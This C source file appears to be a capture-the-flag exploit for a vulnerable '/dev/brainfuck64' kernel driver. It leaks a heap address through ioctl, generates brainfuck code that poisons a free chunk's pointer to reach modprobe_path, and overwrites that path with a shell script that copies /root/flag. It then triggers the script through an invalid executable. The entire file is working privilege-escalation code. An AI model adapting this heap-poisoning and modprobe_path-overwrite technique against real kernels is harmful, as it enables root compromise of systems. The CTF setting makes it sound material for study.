#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/mman.h>

#define DEV_READ        0xD00DC0D3
#define DEV_WRITE       0xAC1DC0D3
#define DEV_EXEC        0xBAADC0D3
#define HEADER          0x34364642
#define MODPROBE_PATH   0xffffffff81a3f7a0

struct dev_package {
    long magic;
    long size;
};

int ioctl(int fp, unsigned long request, unsigned long param) {
    return syscall(16, fp, request, param);
}

void init_program(int fp, long size) {
    struct dev_package package;

    package.magic = HEADER;
    package.size = size;

    ioctl(fp, DEV_WRITE, &package);
}

void read_buffer(int fp, char *buffer) {
    ioctl(fp, DEV_READ, buffer);
}

void exec_code(int fp, char*buffer) {
    ioctl(fp, DEV_EXEC, buffer);
}

void prepare_modprobe_exploit() {
    printf("[+] Prepare modprobe exploit\n");
    system("echo -ne '#!/bin/sh\n/bin/cat /root/flag > /home/user/flag\n/bin/chmod 777 /home/user/flag' > /home/user/p");
    system("chmod +x /home/user/p");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/dummy");
    system("chmod +x /home/user/dummy");
}

char *ptr_payload;

#define ADDOP(x) *(ptr_payload++) = x
#define STARTCODE() memset(payload, 0, 0x1000); ptr_payload = payload;

void change_value(char* src_value, char* dest_value, int size) {
    for (int i=0; i<size; ++i) {
        while (src_value[i] != dest_value[i]) {
            // Increase/decrease value until it matches destination value
            if (src_value[i] > dest_value[i]) {
                ADDOP('-');
                src_value[i]--;
            }    
            else {
                ADDOP('+');
                src_value[i]++;
            }
        }

        // Go to next byte
        ADDOP('>');
    }
}

void execute_program(int fp, char *code, int code_size) {
    int cur_offset = 0;
    char send_code[512] = {0};

    while(cur_offset < code_size) {
        memset(send_code, 0, 512);

        int copy_size = code_size-cur_offset;

        if (copy_size > 500)
            copy_size = 500;

        // Copy current part of code to send code
        memcpy(send_code, code+cur_offset, copy_size);

        exec_code(fp, send_code);

        cur_offset += copy_size;
    }
}

int main(int argc, char *argv) {
    int fp;
    char payload[0x1000] = {0};    

    printf("[+] Prepare modprobe exploit\n");
    prepare_modprobe_exploit();

    printf("[+] Open brainfuck device\n");
    fp = open("/dev/brainfuck64", O_RDWR);
        
    printf("[+] Leak heap address\n");
    init_program(fp, 32);

    read_buffer(fp, payload);

    long current_fd = *((long*)payload) + 0x20;
    long modprobe_addr = MODPROBE_PATH - 0x10;

    printf("Current FD    : %p\n", current_fd);    
    printf("Dest FD       : %p\n", modprobe_addr);

    printf("[+] Create brainfuck code to corrupt free chunk FD\n");
    STARTCODE();

    // Move to next free chunk fd pointer
    for(int i=0; i<0x20; i++)
        ADDOP('>');        
    
    // Change chunk fd to point above modprobe path
    change_value((char*)&current_fd, (char*)&modprobe_addr, 8);

    printf("[+] Execute brainfuck code\n");
    execute_program(fp, payload, strlen(payload));

    printf("[+] Allocate new program chunk, output buffer pointing to modprobe path chunk\n");
    init_program(fp, 32);
        
    printf("[+] Create brainfuck code for overwriting modprobe_path string pointing to flag copy script\n");
    
    STARTCODE()

    // Move to start of modprobe path string
    for(int i=0; i<0x10; i++) 
        ADDOP('>');
        
    char current_string[] = "/sbin/modprobe";
    char dest_string[] =    "/home/user/p\x00\x00";
    
    change_value(current_string, dest_string, strlen(current_string));

    printf("[+] Execute overwrite brainfuck code\n");
    execute_program(fp, payload, strlen(payload));
    
    printf("Trigger modprobe\n");
    system("/home/user/dummy");
    system("cat /home/user/flag");

    close(fp);

    return 0;
}